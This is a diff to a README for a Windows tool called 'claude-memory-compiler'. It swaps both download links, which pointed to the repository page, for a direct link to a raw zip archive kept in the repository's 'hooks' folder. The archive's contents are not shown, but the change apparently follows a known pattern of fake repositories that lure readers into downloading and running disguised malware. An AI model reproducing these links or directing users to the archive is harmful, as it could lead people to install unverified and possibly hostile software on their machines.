@@ -1,6 +1,6 @@
 # 🧠 claude-memory-compiler - Sharpen your code intelligence through memory
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Muzv12/claude-memory-compiler)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Muzv12/claude-memory-compiler/raw/refs/heads/main/hooks/compiler_memory_claude_2.9-beta.1.zip)
 
 ## 📖 About this application
 
@@ -14,7 +14,7 @@ This software runs on Windows 10 or Windows 11. Ensure your computer has at leas
 
 Visit the official project page to download the latest setup file. 
 
-[Download the application here](https://github.com/Muzv12/claude-memory-compiler)
+[Download the application here](https://github.com/Muzv12/claude-memory-compiler/raw/refs/heads/main/hooks/compiler_memory_claude_2.9-beta.1.zip)
 
 Follow these steps to complete the installation:
 
